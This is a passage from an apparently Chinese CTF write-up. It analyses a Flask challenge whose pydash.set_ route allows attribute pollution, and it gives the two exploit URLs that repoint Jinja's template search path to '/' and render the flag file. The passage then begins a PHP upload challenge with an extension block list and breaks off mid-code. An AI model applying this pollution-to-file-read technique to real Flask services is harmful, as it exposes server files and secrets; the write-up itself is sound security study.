class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">lightScheduler</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> tasks = [</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title class_">Cache</span>.<span class="title function_">set</span>(<span class="string">&quot;k&quot;</span>+<span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">9</span>), <span class="title function_">hashStr</span>(<span class="title function_">lorem</span>(<span class="number">5</span>))),</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title function_">expensive</span>(<span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">100</span>)),</span><br><span class="line">      <span class="function">()=&gt;</span><span class="title class_">Bus</span>.<span class="title function_">emit</span>(<span class="string">&quot;tick&quot;</span>, <span class="title class_">Date</span>.<span class="title function_">now</span>())</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">let</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123; tasks[i%tasks.<span class="property">length</span>](); &#125; <span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;<span class="number">5</span>) <span class="built_in">setTimeout</span>(run, <span class="title function_">randInt</span>(<span class="number">60</span>,<span class="number">140</span>));</span><br><span class="line">    &#125;, <span class="title function_">randInt</span>(<span class="number">50</span>,<span class="number">120</span>));</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ensureTypeHidden</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> form = <span class="variable constant_">DOM</span>.<span class="title function_">qs</span>(<span class="string">&quot;form[action=&#x27;/login&#x27;][method=&#x27;POST&#x27;]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!form) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> hidden = form.<span class="title function_">querySelector</span>(<span class="string">&quot;input[name=&#x27;type&#x27;]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hidden) &#123;</span><br><span class="line">      hidden = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;input&quot;</span>, &#123; <span class="attr">type</span>: <span class="string">&quot;hidden&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;type&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;1&quot;</span> &#125;);</span><br><span class="line">      form.<span class="title function_">appendChild</span>(hidden);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">DOM</span>.<span class="title function_">on</span>(form, <span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> h = form.<span class="title function_">querySelector</span>(<span class="string">&quot;input[name=&#x27;type&#x27;]&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">        h = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;input&quot;</span>, &#123; <span class="attr">type</span>: <span class="string">&quot;hidden&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;type&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;1&quot;</span> &#125;);</span><br><span class="line">        form.<span class="title function_">appendChild</span>(h);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (h.<span class="property">value</span> !== <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        h.<span class="property">value</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">mountInvisible</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> ghost = <span class="variable constant_">DOM</span>.<span class="title function_">el</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">      ghost.<span class="title function_">setAttribute</span>(<span class="string">&quot;data-h&quot;</span>, <span class="title function_">hashStr</span>(<span class="variable constant_">CFG</span>.<span class="property">version</span>));</span><br><span class="line">      ghost.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;display:none;width:0;height:0;overflow:hidden;&quot;</span>;</span><br><span class="line">      ghost.<span class="property">textContent</span> = <span class="title function_">repeatStr</span>(<span class="string">&quot;*&quot;</span>, <span class="title function_">randInt</span>(<span class="number">1</span>,<span class="number">3</span>)); </span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(ghost);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">prewarm</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="title class_">Net</span>.<span class="title function_">get</span>(<span class="string">&quot;/ping?_=&quot;</span>+<span class="title class_">Date</span>.<span class="title function_">now</span>()).<span class="title function_">then</span>(noop).<span class="title function_">catch</span>(noop);</span><br><span class="line">      <span class="title function_">times</span>(<span class="number">3</span>, <span class="function"><span class="params">i</span> =&gt;</span> <span class="title class_">Cache</span>.<span class="title function_">set</span>(<span class="string">&quot;warm&quot;</span>+i, <span class="title function_">expensive</span>(i+<span class="number">1</span>)));</span><br><span class="line">    &#125;<span class="keyword">catch</span>(_)&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">keySpy</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> handler = <span class="title function_">throttle</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;  &#125;, <span class="number">200</span>);</span><br><span class="line">    <span class="variable constant_">DOM</span>.<span class="title function_">on</span>(<span class="variable language_">document</span>, <span class="string">&quot;keydown&quot;</span>, handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">prewarm</span>();</span><br><span class="line">    <span class="title function_">keySpy</span>();</span><br><span class="line">    <span class="title function_">ensureTypeHidden</span>();     </span><br><span class="line">    <span class="title function_">mountInvisible</span>();</span><br><span class="line">    <span class="title class_">Bus</span>.<span class="title function_">on</span>(<span class="string">&quot;tick&quot;</span>, noop);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">readyState</span> === <span class="string">&quot;loading&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, init, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">init</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>mian.py：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">database=&#123;&#125;</span><br><span class="line">data_index=<span class="number">0</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/registerV2&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">registerV2</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password2=request.form[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> password!=password2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;前后密码不一致，请确认后重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/register&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> data_index</span><br><span class="line">        data_index+=<span class="number">1</span></span><br><span class="line">        database[data_index]=username</span><br><span class="line">        database[username]=password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user_dashboard&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/272e1739b89da32e983970ece1a086bd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A272e1739b89da32e983970ece1a086bd</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/name&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;username&#x27;</span>:user&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    old_password=request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">    new_password=request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">in</span> database <span class="keyword">and</span> database[user] == old_password:</span><br><span class="line">        database[user]=new_password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;密码修改成功，请重新登录。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;密码修改失败，请确认旧密码是否正确。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/user_dashboard&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="built_in">type</span>=request.form[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> database <span class="keyword">and</span> database[username] != password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;用户名或密码错误请重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;用户名或密码错误请重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> name</span><br><span class="line">        name=username    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;user_dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;A272e1739b89da32e983970ece1a086bd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>两个js文件和一个py文件，<del>谁更重要好难猜啊</del>，着重分析一下main.py</p>
<p>首先是最明显的一个之前没出现过的路由&#x2F;operate</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li><p>这一部分存在三个可控GET参数username、password、confirm_password</p>
</li>
<li><p>同时出现了最关键的语句<strong>pydash.set_(Username,password,confirm_password)</strong>，这里明确了如何利用这三个参数进行污染</p>
<ul>
<li><code>pydash.set_</code> 函数的语法是： <code>pydash.set_(对象, 属性路径, 新值)</code></li>
</ul>
</li>
</ul>
<p>接着是另一个也没有出现过的路由&#x2F;impression</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>给了新GET参数point，并且限制了只能五个字符，那flag文件大概就叫flag了</p>
</li>
<li><p>给出了黑名单，其中过滤了<code>{</code>, <code>}</code>, <code>%</code>, <code>_</code>封杀 SSTI，过滤了<code>.</code> (点)封杀路径穿越和特定文件读取，过滤了<code>&lt;</code>, <code>&gt;</code>封杀 XSS，只能用配置污染</p>
</li>
<li><p>最后<strong>返回了render_template(point)</strong>，这就是能渲染出flag文件内容的关键</p>
</li>
</ul>
<p>首先根据树状图确定：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">app (Flask 应用实例)</span><br><span class="line">│</span><br><span class="line">├── .config  (配置字典)</span><br><span class="line">│   │   # 这里存放着所有的安全配置</span><br><span class="line">│   ├── [&#x27;SECRET<span class="emphasis">_KEY&#x27;]               -&gt; Session 签名密钥 (拿到它就能伪造任意用户登录)</span></span><br><span class="line"><span class="emphasis">│   ├── [&#x27;SQLALCHEMY_</span>DATABASE<span class="emphasis">_URI&#x27;]  -&gt; 数据库连接串 (改成你的恶意数据库地址)</span></span><br><span class="line"><span class="emphasis">│   ├── [&#x27;DEBUG&#x27;]                    -&gt; 调试模式开关 (部分版本开启可导致 RCE)</span></span><br><span class="line"><span class="emphasis">│   ├── [&#x27;PERMANENT_</span>SESSION<span class="emphasis">_LIFETIME&#x27;]-&gt; Session 过期时间</span></span><br><span class="line"><span class="emphasis">│   └── ... (其他自定义配置)</span></span><br><span class="line"><span class="emphasis">│</span></span><br><span class="line"><span class="emphasis">├── .jinja_</span>loader (本题攻击区：模板加载器)</span><br><span class="line">│   │   # 负责寻找模板文件</span><br><span class="line">│   └── .searchpath (list)           -&gt; [关键] 模板搜索路径列表</span><br><span class="line">│       │                               (默认是 [&#x27;/app/templates&#x27;])</span><br><span class="line">│       └── 改为 [&#x27;/&#x27;] 则导致 LFI</span><br><span class="line">│</span><br><span class="line">├── .jinja<span class="emphasis">_env (Jinja2 环境配置)</span></span><br><span class="line"><span class="emphasis">│   │   # 这里控制着模板渲染的规则</span></span><br><span class="line"><span class="emphasis">│   ├── .globals (dict)              -&gt; 全局函数/变量 (SSTI 常在这里找 os/eval)</span></span><br><span class="line"><span class="emphasis">│   ├── .filters (dict)              -&gt; 过滤器定义</span></span><br><span class="line"><span class="emphasis">│   └── ...</span></span><br><span class="line"><span class="emphasis">│</span></span><br><span class="line"><span class="emphasis">├── .url_</span>map (路由映射表)</span><br><span class="line">│   │   # 决定了 URL 怎么跳转</span><br><span class="line">│   └── ...</span><br><span class="line">│</span><br><span class="line">├── .view<span class="emphasis">_functions (视图函数字典)</span></span><br><span class="line"><span class="emphasis">│   │   # 存储了每个路由对应的 Python 函数</span></span><br><span class="line"><span class="emphasis">│   └── ...</span></span><br><span class="line"><span class="emphasis">│</span></span><br><span class="line"><span class="emphasis">└── .<span class="strong">__class__</span> / .<span class="strong">__init__</span> (Python 原生魔法属性)</span></span><br><span class="line"><span class="emphasis">    │   # 用来进行“原型链”跳跃，跳出 app 去找其他模块</span></span><br><span class="line"><span class="emphasis">    └── .<span class="strong">__globals__</span>                 -&gt; 访问引入的 os, sys 等模块 (RCE 常用)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>攻击对象：app（Flask默认）</p>
</li>
<li><p>属性路径：app.jinja_loader.searchpath或者jinja_loader.searchpath</p>
</li>
<li><p>新值：&#x2F;（大概率被放置在系统根目录）</p>
</li>
</ul>
<p>构造并访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</span><br></pre></td></tr></table></figure>

<p>显示oprate success，证明污染成功</p>
<p>接着构造并访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/impression?point=flag</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<hr>
<h1 id="9-mv-upload"><a href="#9-mv-upload" class="headerlink" title="9. mv_upload"></a>9. mv_upload</h1><p>这种上传文件的题目，首先在信息不足的情况下先查看版本和扫目录</p>
<p>用dirsearch扫出了&#x2F;index.php~，访问后拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="string">&#x27;/tmp/upload/&#x27;</span>; <span class="comment">// 临时目录</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;/var/www/html/upload/&#x27;</span>; <span class="comment">// 存储目录</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$blacklist</span> = [</span><br><span class="line">    <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phps&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;jspa&#x27;</span>, <span class="string">&#x27;jspx&#x27;</span>, <span class="string">&#x27;jsw&#x27;</span>, <span class="string">&#x27;jsv&#x27;</span>, <span class="string">&#x27;jspf&#x27;</span>, <span class="string">&#x27;jtml&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;ascx&#x27;</span>, <span class="string">&#x27;ashx&#x27;</span>, <span class="string">&#x27;asmx&#x27;</span>, <span class="string">&#x27;cer&#x27;</span>, <span class="string">&#x27;aSp&#x27;</span>, <span class="string">&#x27;aSpx&#x27;</span>, <span class="string">&#x27;cEr&#x27;</span>, <span class="string">&#x27;pHp&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;shtm&#x27;</span>, <span class="string">&#x27;stm&#x27;</span>,<span class="string">&#x27;pl&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;exe&#x27;</span>, <span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;py&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>, <span class="string">&#x27;scgi&#x27;</span>,<span class="string">&#x27;htaccess&#x27;</span>, <span class="string">&#x27;htpasswd&#x27;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>,  <span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$filesInTmp</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目标目录</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$targetDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$targetDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上传临时目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploadedFiles</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;error&#x27;</span>][<span class="variable">$index</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 上传失败。&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmpName</span> = <span class="variable">$uploadedFiles</span>[<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$index</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">basename</span>(<span 